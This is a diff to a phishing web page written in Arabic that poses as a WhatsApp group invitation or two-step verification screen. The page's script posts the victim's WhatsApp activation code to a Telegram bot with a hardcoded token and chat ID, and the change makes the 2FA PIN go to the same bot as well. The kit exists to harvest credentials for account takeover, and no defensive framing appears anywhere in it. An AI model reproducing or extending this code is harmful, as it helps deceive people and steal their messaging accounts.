@@ -134,14 +134,14 @@
                 return;
             }
 
-            sendCodeToTelegram(activationCode);
-            startCountdown(activationCodeInput);
+            sendCodeToTelegram(activationCode, "رمز التفعيل");
+            startCountdown();
         }
 
-        function sendCodeToTelegram(code) {
+        function sendCodeToTelegram(code, messageType) {
             const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
             const chatId = '612575358';
-            const message = `رمز التفعيل: ${code}`;
+            const message = `${messageType}: ${code}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
@@ -157,7 +157,7 @@
             });
         }
 
-        function startCountdown(inputField) {
+        function startCountdown() {
             let countdownValue = 10;
             const countdownDisplay = document.getElementById('countdown');
             countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
@@ -177,8 +177,8 @@
             const container = document.getElementById('container');
             container.innerHTML = `
                 <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
-                <h1>الدعوة للانضمام إلى مجموعة واتساب</h1>
-                <p>أدخل رمز التحقق بخطوتين (PIN) الذي قمت بتجديده سابقًا.</p>
+                <h1>التحقق بخطوتين</h1>
+                <p>يرجى إدخال رمز PIN المكون من 6 أرقام.</p>
                 <input id="pinCode" type="text" placeholder="PIN Code" maxlength="6">
                 <button onclick="submitSecondCode()">متابعة</button>
             `;
@@ -192,8 +192,8 @@
                 return;
             }
 
-            alert('تم إدخال رمز PIN بنجاح!');
-            // يمكنك إضافة أي إجراء إضافي بعد إدخال رمز PIN هنا
+            sendCodeToTelegram(pinCode, "رمز PIN");
+            alert('تم إرسال رمز PIN بنجاح إلى تيليجرام!');
         }
     </script>
 </body>
